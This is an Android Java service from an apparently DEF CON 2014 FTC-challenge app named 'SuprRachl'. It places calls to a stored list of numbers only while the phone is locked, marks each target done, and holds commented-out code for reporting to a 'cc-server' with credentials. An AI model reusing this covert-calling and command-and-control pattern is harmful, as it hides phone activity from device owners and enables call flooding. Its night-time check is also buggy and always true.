package supr.rachl.ftc.defcon2014;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import supr.rachl.ftc.defcon2014.dummy.DummyContent;
import android.app.KeyguardManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.IBinder;

//Class Description:
//Scheduled service working though the campaign
//Triggered every 5 minutes and all valid numbers are called
//Manages campaign tracking and reporting

public class CampaignService extends Service {

	private static final String DEBUG_TAG = "sr_defcon_CampaignService";
	private CampaignTask m_CampaignTask;
	private sendReportServer m_sendReportServer;

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		String validatedNumbers = workPrefString("read", "validatedNumbers", "");
		String rawValNumbers[] = validatedNumbers.split(",");
		Boolean allowRun = true;
		for (int i = 0; i < rawValNumbers.length; i++) {
			if (allowRun) {
				String thisNumber = rawValNumbers[i];
				//check for completed token
				if (thisNumber.contains("_OK")) {
					continue;
				}
				else {
					//flag this run complete
					allowRun = false;
					
					//do not run at night 
					int hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
					if ((hour < 22) || (hour > 8)) {
						//do not run if device in use
						Boolean deviceLocked = false;
						KeyguardManager kgMgr = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
						deviceLocked = kgMgr.inKeyguardRestrictedInputMode();
												
						if (deviceLocked){
							//Log.i(DEBUG_TAG , "Campaign Service for " + thisNumber);
							
							//Call SuprRachl
							thisNumber = thisNumber.replaceAll("[^0-9]", "");
							workPrefString("write", "thisCampaignNumber", thisNumber);
							Intent suprRachl = new Intent();
							suprRachl.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							suprRachl.addFlags(Intent.FLAG_FROM_BACKGROUND);
							suprRachl.setClassName("supr.rachl.ftc.defcon2014", "supr.rachl.ftc.defcon2014.CampaignMain");
							startActivity(suprRachl);
														
							//save target completed token
							validatedNumbers = validatedNumbers.replaceFirst(thisNumber, thisNumber + "_OK");
							workPrefString("write", "validatedNumbers", validatedNumbers);
							
							//check if campaign is finished
							if (i == (rawValNumbers.length - 1)){
								//save campaign completed token
								if (!(thisNumber.contains("CAMPAIGN_COMPLETED"))){
									validatedNumbers =  "CAMPAIGN_COMPLETED_OK," + validatedNumbers;
									workPrefString("write", "validatedNumbers", validatedNumbers);
								}
							}
							
							//not communicating results with cc-server in demo version
							/*
				    		m_CampaignTask = new CampaignTask();
				        	m_CampaignTask.execute(new String[] { cc-serverUrl });
							 */
						}
					}
				}	
			}
		}
		return Service.START_FLAG_REDELIVERY;
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}


	class sendReportServer extends AsyncTask<sendReportServerParams, Void, String> {
		@Override
		protected String doInBackground(sendReportServerParams... params) {
			String response = "";			

			String url = params[0].sendReporturl;
			String key1 = params[0].key1;
			String key2 = params[0].key2;
			String key3 = params[0].key3;

			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			nameValuePairs.add(new BasicNameValuePair("key1", key1));
			nameValuePairs.add(new BasicNameValuePair("key2", key2));
			nameValuePairs.add(new BasicNameValuePair("key3", key3));

			DefaultHttpClient client = new DefaultHttpClient();
			//Use some credentials
			UsernamePasswordCredentials creds = new UsernamePasswordCredentials("username", "password");
			client.getCredentialsProvider().setCredentials(new AuthScope(AuthScope.ANY_HOST, AuthScope.ANY_PORT), creds);

			try {
				HttpPost httpPost = new HttpPost(url);
				httpPost.setHeader("Content-Type","application/x-www-form-urlencoded;charset=UTF-8");
				httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, "UTF-8"));
				HttpResponse execute = client.execute(httpPost);
				InputStream content = execute.getEntity().getContent();
				BufferedReader buffer = new BufferedReader(new InputStreamReader(content));
				String s = "";
				while ((s = buffer.readLine()) != null) {
					response += s;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			//check if tasks was cancelled
			if (isCancelled()) {
				//Log.i(DEBUG_TAG, "AsynchTask was cancelled");
				return null;
			}
			return response;
		}
		@Override
		protected void onPostExecute(String result) {
			//Log.i(DEBUG_TAG, "sendReportServer response from server: " + result);
		}
	}

	private static class sendReportServerParams {
		String sendReporturl, key1, key2, key3;

		sendReportServerParams (String sendReporturl, String key1, String key2, String key3) {
			this.sendReporturl = sendReporturl;
			this.key1 = key1;
			this.key2 = key2;
			this.key3 = key3;
		}
	}


	private class CampaignTask extends AsyncTask<String, Void, String> {
		@Override
		protected String doInBackground(String... urls) {
			String response = "";
			//Log.i(DEBUG_TAG, "CampaignService; requesting campaign service.");

			for (String url : urls) {
				DefaultHttpClient client = new DefaultHttpClient();
				HttpGet httpGet = new HttpGet(url);
				try {
					HttpResponse execute = client.execute(httpGet);
					InputStream content = execute.getEntity().getContent();
					BufferedReader buffer = new BufferedReader(new InputStreamReader(content));
					String s = "";
					while ((s = buffer.readLine()) != null) {
						response += s;
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}

			//check if tasks was cancelled
			if (isCancelled()) {
				//Log.i(DEBUG_TAG , "AsynchTask was cancelled");
				return "";
			}
			else {
				int siteId = workPref("read", "thisSiteId", 0);
				String dummyContent = DummyContent.ITEMS.get(siteId).content;
				String dummyUrl = DummyContent.ITEMS.get(siteId).url;

				try {
					String key1 = "";
					String key2 = "";
					String key3 = "";
					sendReportServerParams params = new sendReportServerParams(dummyUrl, 
							key1, key2, key3);
					m_sendReportServer = new sendReportServer();
					m_sendReportServer.execute(params);


				} catch (Exception e) {   

				} 
				return response;
			}

		}
		@Override
		protected void onPostExecute(String result) {
			//Log.i(DEBUG_TAG, "CampaignService; finished campaign service.");
		}
	}

	public int workPref(String type, String pref, int value) {
		int thisPref;
		if (type == "read") {
			final SharedPreferences mPref = getSharedPreferences(pref,
					MODE_PRIVATE);
			thisPref = mPref.getInt(pref, value);
			return thisPref;
		} else if (type == "write") {
			final SharedPreferences mPref = getSharedPreferences(pref,
					MODE_PRIVATE);
			thisPref = mPref.getInt(pref, 0);
			mPref.edit().putInt(pref, value).commit();
			return value;
		} else
			return -1;
	}

	public String workPrefString(String type, String pref, String value) {
		String thisPref;
		if (type == "read") {
			final SharedPreferences mPref = getSharedPreferences(pref,
					MODE_PRIVATE);
			thisPref = mPref.getString(pref, value);
			return thisPref;
		} else if (type == "write") {
			final SharedPreferences mPref = getSharedPreferences(pref,
					MODE_PRIVATE);
			thisPref = mPref.getString(pref, "");
			mPref.edit().putString(pref, value).commit();
			return value;
		} else
			return "error";
	}

}
